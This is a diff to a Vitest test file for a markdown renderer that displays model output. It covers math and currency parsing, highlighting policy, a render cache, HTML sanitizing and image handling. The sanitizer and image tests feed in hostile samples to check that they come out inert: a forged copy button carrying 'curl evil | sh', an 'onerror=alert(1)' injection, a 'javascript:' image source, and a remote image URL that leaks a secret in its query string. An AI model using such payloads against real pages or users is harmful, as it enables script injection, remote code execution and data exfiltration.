@@ -1,5 +1,19 @@
-import { describe, it, expect } from 'vitest';
-import { renderMarkdownSafe, parseMarkdown } from '../markdownRenderer';
+import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
+import DOMPurify from 'dompurify';
+// The instance the renderer registers its grammars on; importing the full
+// 'highlight.js' here would register all 192 onto it.
+import hljs from 'highlight.js/lib/core';
+import { renderMarkdownSafe, clearMarkdownCache, markdownCacheSize } from '../markdownRenderer';
+
+/** Bypasses the stored result of an earlier test; `cache: false` still reads the cache. */
+function renderFresh(content: string, disableMath = false): string {
+  clearMarkdownCache();
+  return renderMarkdownSafe(content, { disableMath, cache: false });
+}
+
+function countKatex(html: string): number {
+  return html.match(/class="katex"/g)?.length ?? 0;
+}
 
 describe('markdownRenderer', () => {
   describe('code block protection', () => {
@@ -76,6 +90,42 @@ More math: $a+b$`;
       // Fraction is math
       expect(result).toContain('katex');
     });
+
+    it('renders an integer between dollars as math', () => {
+      expect(countKatex(renderFresh('Answer: $100$'))).toBe(1);
+    });
+
+    it('applies Disable Math inside <thinking>', () => {
+      const result = renderFresh('<thinking>\nEnergy $E=mc^2$\n</thinking>', true);
+      expect(result).toContain('<thinking>');
+      expect(result).toContain('$E=mc^2$');
+      expect(result).not.toContain('katex');
+    });
+
+    it('still renders math inside <thinking> when math is on', () => {
+      expect(renderFresh('<thinking>\nEnergy $E=mc^2$\n</thinking>')).toContain('katex');
+    });
+  });
+
+  describe('currency false positive prevention', () => {
+    it.each([
+      ['The price is from $1.5 to $2.25', 0],
+      ['It costs $50 dollars', 0],
+      ['From $start to $end point', 0],
+      ['Price is \\$100 but formula $x^2 + y^2 = r^2$ works', 1],
+      ['Price is $100 but formula $x^2 + y^2 = r^2$ works', 1],
+      ['The price is $1.5, $(x^2)$', 1],
+      ['I paid $20 for $\\frac{1}{4}$ of pizza', 1],
+      ['Test $A$B$C$ here', 2],
+      ['Invalid: $$\\bad{$$ text', 0],
+    ])('%s renders %i math spans', (input, expected) => {
+      expect(countKatex(renderFresh(input))).toBe(expected);
+    });
+
+    it('keeps the currency text next to math', () => {
+      const result = renderFresh('Price is $100 but formula $x^2 + y^2 = r^2$ works');
+      expect(result).toContain('$100 but formula');
+    });
   });
 
   describe('code block rendering', () => {
@@ -92,9 +142,112 @@ More math: $a+b$`;
     });
 
     it('should syntax highlight code blocks', () => {
-      const result = parseMarkdown('```javascript\nconst x = 1;\n```');
+      const result = renderFresh('```javascript\nconst x = 1;\n```');
       // hljs adds span classes for highlighting
       expect(result).toContain('hljs-');
+    });
+  });
+
+  describe('language detection policy', () => {
+    afterEach(() => {
+      vi.restoreAllMocks();
+    });
+
+    it('auto-detects small unlabeled fences against the short language list', () => {
+      const spy = vi.spyOn(hljs, 'highlightAuto');
+      renderFresh('```\nconst x: number = 1;\n```');
+      expect(spy).toHaveBeenCalledTimes(1);
+      expect(spy.mock.calls[0][1]).toEqual(expect.arrayContaining(['typescript', 'python']));
+      expect(spy.mock.calls[0][1]!.length).toBeLessThan(20);
+    });
+
+    it('escapes large unlabeled fences without auto-detection', () => {
+      const spy = vi.spyOn(hljs, 'highlightAuto');
+      const log = 'INFO worker processed item <id> status=ok\n'.repeat(200);
+      const result = renderFresh('```\n' + log + '```');
+      expect(spy).not.toHaveBeenCalled();
+      expect(result).toContain('&lt;id&gt;');
+      expect(result).not.toContain('hljs-');
+    });
+
+    it('escapes fences with an unknown language tag without auto-detection', () => {
+      const spy = vi.spyOn(hljs, 'highlightAuto');
+      const result = renderFresh('```log\nfunction <b>x</b>() {}\n```');
+      expect(spy).not.toHaveBeenCalled();
+      expect(result).toContain('&lt;b&gt;x&lt;/b&gt;');
+      expect(result).toContain('code-copy-button');
+    });
+
+    it.each([
+      ['sh', 'echo "hi" # greet'],
+      ['shell', '$ npm install\nadded 1 package'],
+      ['console', '$ ls -la'],
+      ['html', '<div class="x">hi</div>'],
+      ['ts', 'const x: number = 1;'],
+      ['tsx', 'const x: number = 1;'],
+      ['toml', '[server]\nport = 8080'],
+      ['yml', 'key: value'],
+      ['py', 'def f():\n    return 1'],
+      ['dockerfile', 'FROM node:20\nRUN npm ci'],
+      ['kt', 'fun main() {}'],
+      ['cs', 'public class A {}'],
+    ])('highlights the %s label from the curated grammar list', (label, code) => {
+      const result = renderFresh('```' + label + '\n' + code + '\n```');
+      expect(result).toContain('hljs-');
+    });
+
+    it('escapes a label whose grammar is only in the full highlight.js build', () => {
+      expect(hljs.getLanguage('clojure')).toBeUndefined();
+      const result = renderFresh('```clojure\n(defn <b>x</b> [] 1)\n```');
+      expect(result).toContain('&lt;b&gt;x&lt;/b&gt;');
+      expect(result).not.toContain('hljs-');
+    });
+  });
+
+  describe('render cache', () => {
+    beforeEach(() => {
+      clearMarkdownCache();
+    });
+
+    afterEach(() => {
+      vi.restoreAllMocks();
+    });
+
+    it('returns the cached HTML for repeated input without re-sanitizing', () => {
+      const spy = vi.spyOn(DOMPurify, 'sanitize');
+      const input = '# Title\n\n```ts\nconst x = 1;\n```';
+      const first = renderMarkdownSafe(input);
+      const second = renderMarkdownSafe(input);
+      expect(second).toBe(first);
+      expect(spy).toHaveBeenCalledTimes(1);
+      expect(second).toContain('code-copy-button');
+    });
+
+    it('keys the cache on the disableMath option', () => {
+      const withMath = renderMarkdownSafe('Energy $E=mc^2$');
+      const withoutMath = renderMarkdownSafe('Energy $E=mc^2$', { disableMath: true });
+      expect(withMath).toContain('katex');
+      expect(withoutMath).not.toContain('katex');
+    });
+
+    it('evicts the least recently used entries past the entry cap', () => {
+      const spy = vi.spyOn(DOMPurify, 'sanitize');
+      renderMarkdownSafe('first');
+      for (let i = 0; i < 250; i++) renderMarkdownSafe(`filler ${i}`);
+      spy.mockClear();
+      renderMarkdownSafe('first');
+      expect(spy).toHaveBeenCalledTimes(1);
+    });
+
+    it('cache: false renders without storing, but still reads a cached render', () => {
+      const spy = vi.spyOn(DOMPurify, 'sanitize');
+      renderMarkdownSafe('partial reply', { cache: false });
+      expect(markdownCacheSize()).toBe(0);
+
+      renderMarkdownSafe('finished reply');
+      spy.mockClear();
+      renderMarkdownSafe('finished reply', { cache: false });
+      expect(spy).not.toHaveBeenCalled();
     });
   });
 
@@ -263,6 +416,135 @@ More math: $a+b$`;
       // The citation link should be preserved (DOMPurify decodes entities)
       expect(result).toContain('citation-link');
       expect(result).toContain('title="*bold* and _italic_"');
+    });
+  });
+
+  describe('sanitizer', () => {
+    it('strips <style> elements and style attributes from model HTML', () => {
+      const result = renderFresh('<p style="color:red">x</p><style>*{display:none}</style>');
+      expect(result).not.toContain('<style');
+      expect(result).not.toContain('style=');
+      expect(result).toContain('<p>x</p>');
+    });
+
+    it('drops app classes, keeping only citation-link', () => {
+      const result = renderFresh('<div class="fixed inset-0 z-50">overlay</div>');
+      expect(result).toBe('<div>overlay</div>');
+    });
+
+    it('drops a forged copy button and its data-code', () => {
+      const result = renderFresh(
+        '<span class="code-copy-button" data-code="curl evil | sh">📋</span>'
+      );
+      expect(result).not.toContain('code-copy-button');
+      expect(result).not.toContain('data-code');
+    });
+
+    it('strips form controls', () => {
+      const result = renderFresh(
+        '<form action="https://x.example"><input name="a"><textarea>t</textarea>' +
+          '<select><option>o</option></select><button>go</button></form>'
+      );
+      expect(result).not.toMatch(/<(form|input|textarea|select|option|button)\b/);
+    });
+
+    it('strips elements and attributes that fetch remote resources', () => {
+      const result = renderFresh(
+        '<svg><image href="https://x.example/a"></image></svg>' +
+          '<table background="https://x.example/b"><tr><td>t</td></tr></table>' +
+          '<video poster="https://x.example/c" src="https://x.example/d"></video>' +
+          '<audio src="https://x.example/e"></audio>' +
+          '<img src="data:image/png;base64,AAAA" srcset="https://x.example/f 2x">'
+      );
+      expect(result).not.toContain('x.example');
+      expect(result).not.toMatch(/<(svg|image|video|audio)\b/);
+    });
+
+    it('keeps citation links with their attributes and opens them in a new tab', () => {
+      const result = renderFresh(
+        'Fact<a href="https://example.com" title="Source" data-cited="quoted" class="citation-link">src</a>'
+      );
+      expect(result).toContain('class="citation-link"');
+      expect(result).toContain('data-cited="quoted"');
+      expect(result).toContain('title="Source"');
+      expect(result).toContain('target="_blank"');
+      expect(result).toContain('rel="noopener noreferrer"');
+    });
+
+    it('opens markdown links in a new tab', () => {
+      expect(renderFresh('[docs](https://example.com)')).toBe(
+        '<p><a href="https://example.com" target="_blank" rel="noopener noreferrer">docs</a></p>\n'
+      );
+    });
+
+    it('keeps the inline styles KaTeX needs', () => {
+      expect(renderFresh('$x^2$')).toMatch(/<span class="katex">[\s\S]*style="/);
+    });
+
+    it('renders GFM task items as disabled checkboxes', () => {
+      const result = renderFresh('- [x] done\n- [ ] todo');
+      expect(result).toContain('<input type="checkbox" disabled checked>');
+      expect(result).toContain('<input type="checkbox" disabled>');
+    });
+
+    it('escapes code in the copy button data-code attribute', () => {
+      const result = renderFresh('```\na "quoted" <b>&</b>\n```');
+      expect(result).toContain('data-code="a &quot;quoted&quot; &lt;b&gt;&amp;&lt;/b&gt;"');
+    });
+
+    it('renders replacement patterns in code verbatim', () => {
+      const result = renderFresh("```text\necho $& $` $' $$\n```");
+      expect(result).toContain('echo $&amp; $` $&#039; $$');
+    });
+
+    it('keeps a hostile fence info string inert', () => {
+      const result = renderFresh('```x"><img src=x onerror=alert(1)>\ncode\n```');
+      expect(result).not.toContain('<img');
+      expect(result).toContain('class="language-x&quot;&gt;&lt;img"');
+    });
+
+    it('does not fill a forged slot placeholder', () => {
+      const result = renderFresh('$x^2$ <span data-md-slot="x-0">forged</span>');
+      expect(result).toContain('<span>forged</span>');
+      expect(countKatex(result)).toBe(1);
+    });
+  });
+
+  describe('image policy', () => {
+    it('turns a remote image into a link instead of loading it', () => {
+      const result = renderFresh('![secret chart](https://x.example/?d=SECRET)');
+      expect(result).not.toContain('<img');
+      expect(result).toContain(
+        '<a href="https://x.example/?d=SECRET" target="_blank" rel="noopener noreferrer">🖼 secret chart (x.example)</a>'
+      );
+    });
+
+    it('handles raw <img> HTML the same way', () => {
+      const result = renderFresh('<img src="https://x.example/p.png">');
+      expect(result).not.toContain('<img');
+      expect(result).toContain('href="https://x.example/p.png"');
+      expect(result).toContain('🖼 image (x.example)');
+    });
+
+    it('keeps the outer link of a linked image without nesting anchors', () => {
+      const result = renderFresh('[![build](https://x.example/b.svg)](https://y.example)');
+      expect(result).not.toContain('<img');
+      expect(result.match(/<a /g)).toHaveLength(1);
+      expect(result).toContain('href="https://y.example"');
+      expect(result).toContain('<span>🖼 build (x.example)</span>');
+    });
+
+    it('keeps inline data:image images', () => {
+      expect(renderFresh('![dot](data:image/png;base64,AAAA)')).toContain(
+        '<img src="data:image/png;base64,AAAA" alt="dot">'
+      );
+    });
+
+    it('leaves only the label when the src was unsafe', () => {
+      const result = renderFresh('<img src="javascript:alert(1)" alt="x">');
+      expect(result).not.toContain('<img');
+      expect(result).not.toContain('javascript');
+      expect(result).toContain('🖼 x');
     });
   });
 });
